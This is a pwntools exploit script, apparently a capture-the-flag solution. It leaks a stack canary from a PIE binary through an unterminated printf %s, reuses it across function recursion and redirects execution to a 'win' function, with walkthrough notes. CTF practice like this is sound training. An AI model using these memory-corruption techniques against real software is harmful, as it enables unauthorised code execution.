from pwn import *
from grwnapy.pwn import find_offset

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = sys.argv[1]
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                           EXPLOIT
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# offset = find_offset(exe, b"300\n"+cyclic(500))
# win = elf.symbols['win']
# rop = ROP(elf)
# pop_rdi = rop.find_gadget(['pop rdi', 'ret'])

""" DESC
Defeat a stack canary in a PIE binary by utilizing a bug left in the binary. 

Walkthrough
The backdoor allows for function recursion, so you can leak the canary in the first run then repeat the function.
The canary starts 88 bytes (calculate this from local_70 - local_10 - 8) after the buffer, so fill the buffer with 88 bytes (including the trigger string).
Since the printf in "You said:" uses %s it will print until \x00 is encountered. Entering 88 bytes without ending with null
effectively leaks the canary. (NOTE: the 89th is the newline, replacing the nullbyte of the canary)
"""

win_skip = 0x22f1


trigger = "REPEAT"

while (True):
    payload = flat([b"106\n",
                    b"A"*(88-len(trigger)),
                    trigger
                    ])
    
    io = start()
    io.sendline(payload)
    io.recvuntil(b'REPEAT')
    canary = b"\x00" + io.recv(8)[1:]   # prepend the replaced nullbytes back, remember originally the first byte is the newline 0a
    canary = canary[::-1].hex()      # reorder endiannes and turn to hex string

    payload = flat([b"106\n",
                    b"A"*(88),
                    int(canary,16),
                    b"A"*8,
                    win_skip])

    io.sendline(payload)
    data = io.recvall()
    if b"pwn" in data:
        print(data)
        io.interactive()
        break


"""
Things Learned:
Canaries dont change in function recursion
GHIDRA offset calculation is EZ
Newlines doesnt work like null for some functions
"""
